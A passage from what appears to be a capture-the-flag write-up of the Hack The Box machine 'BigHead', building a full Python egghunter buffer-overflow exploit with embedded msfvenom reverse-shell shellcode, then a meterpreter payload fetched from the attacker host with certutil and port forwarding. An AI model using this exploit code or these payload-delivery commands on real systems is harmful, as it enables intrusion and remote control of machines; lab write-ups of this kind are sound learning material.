<p><code class="language-plaintext highlighter-rouge">host</code> is for the ip of the machine, <code class="language-plaintext highlighter-rouge">port</code> is for the port and <code class="language-plaintext highlighter-rouge">egg</code> is to hold the value of the egg. After that comes the <code class="language-plaintext highlighter-rouge">buf</code> variable generated by <code class="language-plaintext highlighter-rouge">msfvenom</code> (this is the my shellcode you should generate a new one with your ip and listening port) :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">buf</span> <span class="o">=</span>  <span class="s">""</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"d9c7d97424f45a2bc9bb9f0948"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"3bb15283c204315a1303c51aaa"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"ce05f4a831f505cdb81034cddf"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"5167fd94378476f8a31ffad5c4"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"a8b103eb29e9706aaaf0a44c93"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"3ab98dd42730df8d2ce7cfba79"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"3464f06c3c99418e6d0cd9c9ad"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"af0e62e4b7534fbe4ca73b4184"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"f9c4eee93537ee2ef1a8854601"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"549e9d7b822b05db418be1dd86"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"4a62d163182cf672cd4702fef0"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"878244d703ce1f7612aace8744"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"15ae2d0fb8bb5f52d508526c25"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"07e51f17885db71b4178405b78"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"3cdea2833df760d76d6f4058e6"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"6f6d8da93fc17e0aefa12ee2e5"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"2d101206e439b9fd6f4c34ee74"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"384a108e81c3f6fae185a19298"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"8f3902641a4404eea9b9cb07c7"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"a9bce792936bf708bbf06ad73b"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"7e97406cd76999f8c5d0331e14"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"847c9ac375822381c2a0335fca"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"ec670f9dbad1e9770d8ba324c7"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"5b3507d81d3a42aec18b3bf7fe"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"24acff87584cff52d97c4afe48"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"15136bc978a4460e852762ef72"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"3707ea3ffff486506afa3550bf"</span>

</code></pre></div></div>
<p>I created a variable to hold the final shellcode (egg doubled + shellcode) and another variable for the egghunter :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="n">egg</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">binascii</span><span class="p">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
<span class="n">egghunter</span> <span class="o">=</span> <span class="s">"6681caff0f42526a0258cd2e3c055a74efb8"</span> <span class="o">+</span> <span class="n">binascii</span><span class="p">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">egg</span><span class="p">)</span> <span class="o">+</span> <span class="s">"8bfaaf75eaaf75e7ffe7"</span>
</code></pre></div></div>
<p>Note : there’s a variable called <code class="language-plaintext highlighter-rouge">N</code>, that will come later and it has nothing to do with the exploit itself.<br>
Now we need to create two functions. First one is to send the shellcode through a POST request, The other one is to exploit the vulnerability and send the egghunter.<br>
We will start by defining the function :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">send_shellcode</span><span class="p">(</span><span class="n">N</span><span class="p">,</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">egg</span><span class="p">,</span><span class="n">shellcode</span><span class="p">):</span>
</code></pre></div></div>
<p>Then we will open a TCP stream socket to the server and the port and hold it in a variable called <code class="language-plaintext highlighter-rouge">s</code> :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>
<p>Last thing to do is to send the POST request with the shellcode :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"POST / HTTP/1.1</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"Host: dev.bighead.htb</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"Content-Length: %s</span><span class="se">\r\n</span><span class="s">"</span><span class="o">%</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="o">+</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
</code></pre></div></div>
<p>Then we will close the stream : <code class="language-plaintext highlighter-rouge">s.close()</code>
<br>I added this in a <code class="language-plaintext highlighter-rouge">for</code> loop to send the shellcode 16 times. I did this because I wanted to put the shellcode in different places so the egghunter finds it easily. I also added a print statement at the start of the function : <code class="language-plaintext highlighter-rouge">print "\033[32m [*] Sending Shellcode"</code>, <code class="language-plaintext highlighter-rouge">\033[32m</code> is for the color it’s not important for the exploit. And I added a print statement before closing the stream : <code class="language-plaintext highlighter-rouge">print '\033[34m' + '[' + str(N) + '] ' + re.sub(r"\s"," ",s.recv(12))</code>. <code class="language-plaintext highlighter-rouge">re.sub(r"\s"," ",s.recv(12))</code> This will use <code class="language-plaintext highlighter-rouge">re</code> (regular expressions operations) to print the first 12 chars of the first line of the server response (“HTTP/1.1” + “ “ + status code (3 chars) = 12).<br>
<code class="language-plaintext highlighter-rouge">send_shellcode</code> :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">send_shellcode</span><span class="p">(</span><span class="n">N</span><span class="p">,</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">egg</span><span class="p">,</span><span class="n">shellcode</span><span class="p">):</span>
	<span class="k">print</span> <span class="s">"</span><span class="se">\033</span><span class="s">[32m [*] Sending Shellcode"</span>
	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">16</span><span class="p">):</span>
		<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
		<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
		<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"POST / HTTP/1.1</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
		<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"Host: dev.bighead.htb</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
		<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"Content-Length: %s</span><span class="se">\r\n</span><span class="s">"</span><span class="o">%</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
		<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
		<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="o">+</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
		<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
		<span class="k">print</span> <span class="s">'</span><span class="se">\033</span><span class="s">[34m'</span> <span class="o">+</span> <span class="s">'['</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">N</span><span class="p">)</span> <span class="o">+</span> <span class="s">'] '</span> <span class="o">+</span> <span class="n">re</span><span class="p">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s">"\s"</span><span class="p">,</span><span class="s">" "</span><span class="p">,</span><span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">12</span><span class="p">))</span>
		<span class="n">s</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
		<span class="n">N</span> <span class="o">+=</span> <span class="mi">1</span>
	<span class="k">print</span> <span class="s">"</span><span class="se">\033</span><span class="s">[32m [*] Done"</span>
</code></pre></div></div>
<p>That’s for <code class="language-plaintext highlighter-rouge">send_shellcode</code>, let’s write <code class="language-plaintext highlighter-rouge">send_egghunter</code>. We will define the function first :
<br><code class="language-plaintext highlighter-rouge">def send_egghunter(host,port,egghunter):</code>
<br>Then we will open a TCP stream socket to the server and the port and hold it in a variable called <code class="language-plaintext highlighter-rouge">s</code> :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
</code></pre></div></div>
<p>Then we will connect and send the HEAD request :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
<span class="n">s</span><span class="p">.</span><span class="n">settimeout</span><span class="p">(</span><span class="bp">None</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"HEAD /"</span> <span class="o">+</span> <span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">72</span><span class="p">)</span> <span class="o">+</span> <span class="s">"f0125062"</span> <span class="o">+</span> <span class="n">egghunter</span> <span class="o">+</span> <span class="s">" HTTP/1.1</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"Host: dev.bighead.htb</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
</code></pre></div></div>
<p>I did <code class="language-plaintext highlighter-rouge">settimeout(None)</code> as the server takes a lot of time to respond to this request (Because we will change the code flow so the server won’t reply) and we don’t want the stream to be closed before our egghunter is successfully executed.<br>
<code class="language-plaintext highlighter-rouge">s.send("HEAD /" + ("A"*72) + "f0125062" + egghunter + " HTTP/1.1\r\n")</code> This line sends 72 A’s then <code class="language-plaintext highlighter-rouge">f0125062</code> (jmp esp (new EIP)) then the egghunter.<br>
<code class="language-plaintext highlighter-rouge">send_egghunter</code> :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">send_egghunter</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">egghunter</span><span class="p">):</span>
	<span class="k">print</span> <span class="s">"</span><span class="se">\033</span><span class="s">[32m [*] Sending EggHunter"</span>
	<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
	<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
	<span class="n">s</span><span class="p">.</span><span class="n">settimeout</span><span class="p">(</span><span class="bp">None</span><span class="p">)</span>
	<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"HEAD /"</span> <span class="o">+</span> <span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">72</span><span class="p">)</span> <span class="o">+</span> <span class="s">"f0125062"</span> <span class="o">+</span> <span class="n">egghunter</span> <span class="o">+</span> <span class="s">" HTTP/1.1</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
	<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"Host: dev.bighead.htb</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
	<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
	<span class="k">print</span> <span class="s">'</span><span class="se">\033</span><span class="s">[34m'</span> <span class="o">+</span> <span class="n">re</span><span class="p">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s">"\s"</span><span class="p">,</span><span class="s">" "</span><span class="p">,</span><span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">12</span><span class="p">))</span>
	<span class="n">s</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
	<span class="k">print</span> <span class="s">"</span><span class="se">\033</span><span class="s">[32m [*] Done"</span>
</code></pre></div></div>
<p>The exploit is ready, we just need to call the functions :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">send_shellcode</span><span class="p">(</span><span class="n">N</span><span class="p">,</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">egg</span><span class="p">,</span><span class="n">shellcode</span><span class="p">)</span>
<span class="n">send_egghunter</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">egghunter</span><span class="p">)</span>
</code></pre></div></div>
<p>Final Exploit :</p>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python
</span><span class="kn">import</span> <span class="nn">socket</span>
<span class="kn">import</span> <span class="nn">binascii</span>
<span class="kn">import</span> <span class="nn">re</span>

<span class="n">host</span> <span class="o">=</span> <span class="s">'10.10.10.112'</span>
<span class="n">port</span> <span class="o">=</span> <span class="mi">80</span>
<span class="n">egg</span> <span class="o">=</span> <span class="s">'R1ck'</span>

<span class="n">N</span> <span class="o">=</span> <span class="mi">0</span>

<span class="n">buf</span> <span class="o">=</span>  <span class="s">""</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"d9c7d97424f45a2bc9bb9f0948"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"3bb15283c204315a1303c51aaa"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"ce05f4a831f505cdb81034cddf"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"5167fd94378476f8a31ffad5c4"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"a8b103eb29e9706aaaf0a44c93"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"3ab98dd42730df8d2ce7cfba79"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"3464f06c3c99418e6d0cd9c9ad"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"af0e62e4b7534fbe4ca73b4184"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"f9c4eee93537ee2ef1a8854601"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"549e9d7b822b05db418be1dd86"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"4a62d163182cf672cd4702fef0"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"878244d703ce1f7612aace8744"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"15ae2d0fb8bb5f52d508526c25"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"07e51f17885db71b4178405b78"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"3cdea2833df760d76d6f4058e6"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"6f6d8da93fc17e0aefa12ee2e5"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"2d101206e439b9fd6f4c34ee74"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"384a108e81c3f6fae185a19298"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"8f3902641a4404eea9b9cb07c7"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"a9bce792936bf708bbf06ad73b"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"7e97406cd76999f8c5d0331e14"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"847c9ac375822381c2a0335fca"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"ec670f9dbad1e9770d8ba324c7"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"5b3507d81d3a42aec18b3bf7fe"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"24acff87584cff52d97c4afe48"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"15136bc978a4460e852762ef72"</span>
<span class="n">buf</span> <span class="o">+=</span> <span class="s">"3707ea3ffff486506afa3550bf"</span>

<span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span><span class="n">egg</span> <span class="o">*</span> <span class="mi">2</span><span class="p">)</span> <span class="o">+</span> <span class="n">binascii</span><span class="p">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
<span class="n">egghunter</span> <span class="o">=</span> <span class="s">"6681caff0f42526a0258cd2e3c055a74efb8"</span> <span class="o">+</span> <span class="n">binascii</span><span class="p">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">egg</span><span class="p">)</span> <span class="o">+</span> <span class="s">"8bfaaf75eaaf75e7ffe7"</span>

<span class="k">def</span> <span class="nf">send_shellcode</span><span class="p">(</span><span class="n">N</span><span class="p">,</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">egg</span><span class="p">,</span><span class="n">shellcode</span><span class="p">):</span>
	<span class="k">print</span> <span class="s">"</span><span class="se">\033</span><span class="s">[32m [*] Sending Shellcode"</span>
	<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">16</span><span class="p">):</span>
		<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
		<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
		<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"POST / HTTP/1.1</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
		<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"Host: dev.bighead.htb</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
		<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"Content-Length: %s</span><span class="se">\r\n</span><span class="s">"</span><span class="o">%</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span>
		<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
		<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">shellcode</span><span class="o">+</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
		<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
		<span class="k">print</span> <span class="s">'</span><span class="se">\033</span><span class="s">[34m'</span> <span class="o">+</span> <span class="s">'['</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">N</span><span class="p">)</span> <span class="o">+</span> <span class="s">'] '</span> <span class="o">+</span> <span class="n">re</span><span class="p">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s">"\s"</span><span class="p">,</span><span class="s">" "</span><span class="p">,</span><span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">12</span><span class="p">))</span>
		<span class="n">s</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
		<span class="n">N</span> <span class="o">+=</span> <span class="mi">1</span>
	<span class="k">print</span> <span class="s">"</span><span class="se">\033</span><span class="s">[32m [*] Done"</span>

<span class="k">def</span> <span class="nf">send_egghunter</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">egghunter</span><span class="p">):</span>
	<span class="k">print</span> <span class="s">"</span><span class="se">\033</span><span class="s">[32m [*] Sending EggHunter"</span>
	<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="p">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="p">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="p">.</span><span class="n">SOCK_STREAM</span><span class="p">,</span><span class="mi">0</span><span class="p">)</span>
	<span class="n">s</span><span class="p">.</span><span class="n">connect</span><span class="p">((</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">))</span>
	<span class="n">s</span><span class="p">.</span><span class="n">settimeout</span><span class="p">(</span><span class="bp">None</span><span class="p">)</span>
	<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"HEAD /"</span> <span class="o">+</span> <span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="mi">72</span><span class="p">)</span> <span class="o">+</span> <span class="s">"f0125062"</span> <span class="o">+</span> <span class="n">egghunter</span> <span class="o">+</span> <span class="s">" HTTP/1.1</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
	<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"Host: dev.bighead.htb</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
	<span class="n">s</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="s">"</span><span class="se">\r\n</span><span class="s">"</span><span class="p">)</span>
	<span class="k">print</span> <span class="s">'</span><span class="se">\033</span><span class="s">[34m'</span> <span class="o">+</span> <span class="n">re</span><span class="p">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s">"\s"</span><span class="p">,</span><span class="s">" "</span><span class="p">,</span><span class="n">s</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">12</span><span class="p">))</span>
	<span class="n">s</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
	<span class="k">print</span> <span class="s">"</span><span class="se">\033</span><span class="s">[32m [*] Done"</span>

<span class="n">send_shellcode</span><span class="p">(</span><span class="n">N</span><span class="p">,</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">egg</span><span class="p">,</span><span class="n">shellcode</span><span class="p">)</span>
<span class="n">send_egghunter</span><span class="p">(</span><span class="n">host</span><span class="p">,</span><span class="n">port</span><span class="p">,</span><span class="n">egghunter</span><span class="p">)</span>
</code></pre></div></div>
<p>Now it’s show time, Let’s test the exploit :
<br><img src="/images/hackthebox/bighead/83.png" alt="" class="align-center"><br><br>
Perfectly working ! we got a reverse shell.<br></p>

<h2 id="enumeration-enumeration-enumeration-">Enumeration, Enumeration, Enumeration …<br>
</h2>
<p><br><img src="/images/hackthebox/bighead/84.png" alt="" class="align-center"><br><br>
We are on the machine as <code class="language-plaintext highlighter-rouge">nelson</code>, There is another user on the box called <code class="language-plaintext highlighter-rouge">nginx</code> :
<br><img src="/images/hackthebox/bighead/85.png" alt="" class="align-center"><br><br>
I checked <code class="language-plaintext highlighter-rouge">C:\Users\Nelson</code> and <code class="language-plaintext highlighter-rouge">C:\Users\Nelson\Desktop</code> and I found the user flag :
<br><img src="/images/hackthebox/bighead/86.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/87.png" alt="" class="align-center"><br><br>
2962 bytes? Well … no it’s not the user flag :
<br><img src="/images/hackthebox/bighead/88.png" alt="" class="align-center"><br><br>
So we probably we need to be <code class="language-plaintext highlighter-rouge">nginx</code> to get the user flag. And of course we can’t access <code class="language-plaintext highlighter-rouge">nginx</code> directory :
<br><img src="/images/hackthebox/bighead/89.png" alt="" class="align-center"><br><br>
I wanted to upgrade that reverse shell into <code class="language-plaintext highlighter-rouge">meterpreter</code> so I had to create the payload first :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom -p windows/meterpreter_reverse_tcp LHOST=10.10.xx.xx LPORT=1338 -f exe &gt; m.exe
</code></pre></div></div>
<p><br><img src="/images/hackthebox/bighead/90.png" alt="" class="align-center"><br><br>
Then I set up the <code class="language-plaintext highlighter-rouge">meterpreter</code> handler :
<br><img src="/images/hackthebox/bighead/91.png" alt="" class="align-center"><br><br>
I ran a python simple http server on port 80 : <code class="language-plaintext highlighter-rouge">python -m SimpleHTTPServer 80</code> to host the payload. Then I went to <code class="language-plaintext highlighter-rouge">C:\Users\Nelson\AppData\Local\Temp</code> and downloaded the payload with <code class="language-plaintext highlighter-rouge">certutil</code> :
<code class="language-plaintext highlighter-rouge">certutil -urlcache -split -f http://10.10.xx.xx/m.exe m.exe</code>
<br><img src="/images/hackthebox/bighead/92.png" alt="" class="align-center"><br><br>
Then I executed it and got a <code class="language-plaintext highlighter-rouge">meterpreter</code> session :
<br><img src="/images/hackthebox/bighead/93.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/94.png" alt="" class="align-center"><br><br>
From <code class="language-plaintext highlighter-rouge">meterpreter</code> I wanted to look at the services so I did <code class="language-plaintext highlighter-rouge">ps</code>, I looked through them and found an interesting service called <code class="language-plaintext highlighter-rouge">BvSshServer.exe</code>
<br><img src="/images/hackthebox/bighead/95.png" alt="" class="align-center"><br><br>
I wanted to know the listening port of that ssh server, so I did <code class="language-plaintext highlighter-rouge">netstat</code>. It was listening on port 2020 :
<br><img src="/images/hackthebox/bighead/96.png" alt="" class="align-center"><br><br>
So I forwarded that port, We also saw earlier when we went to <code class="language-plaintext highlighter-rouge">code.bighead.htb</code> it redirected us to :</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://127.0.0.1:5080/testlink/login.php
</code></pre></div></div>
<p>I wanted to forward that port too to check what’s in there. To forward a port through <code class="language-plaintext highlighter-rouge">meterpreter</code> we can simply do it with <code class="language-plaintext highlighter-rouge">portfwd</code> :
<br><code class="language-plaintext highlighter-rouge">portfwd add -l 2020 -p 2020 -r bighead.htb</code>
<br><code class="language-plaintext highlighter-rouge">portfwd add -l 5080 -p 5080 -r bighead.htb</code></p>

<p><br><img src="/images/hackthebox/bighead/97.png" alt="" class="align-center"><br><br>
Let’s check if that <code class="language-plaintext highlighter-rouge">BvSshServer</code> is a real ssh server :
<br><img src="/images/hackthebox/bighead/98.png" alt="" class="align-center"><br><br>
It’s working fine, now we need a password to login. We already know the username : <code class="language-plaintext highlighter-rouge">nginx</code>.<br>
I went to <code class="language-plaintext highlighter-rouge">code.bighead.htb</code> again and after I got redirected to port 5080 on <code class="language-plaintext highlighter-rouge">localhost</code> I got some <code class="language-plaintext highlighter-rouge">SQL</code> errors :
<br><img src="/images/hackthebox/bighead/99.png" alt="" class="align-center"><br>
<img src="/images/hackthebox/bighead/100.png" alt="" class="align-center"><br><br>
As you can see it disclosed the root path  of the application : <code class="language-plaintext highlighter-rouge">C:\xampp</code>. I tried to go there but I got access denied :
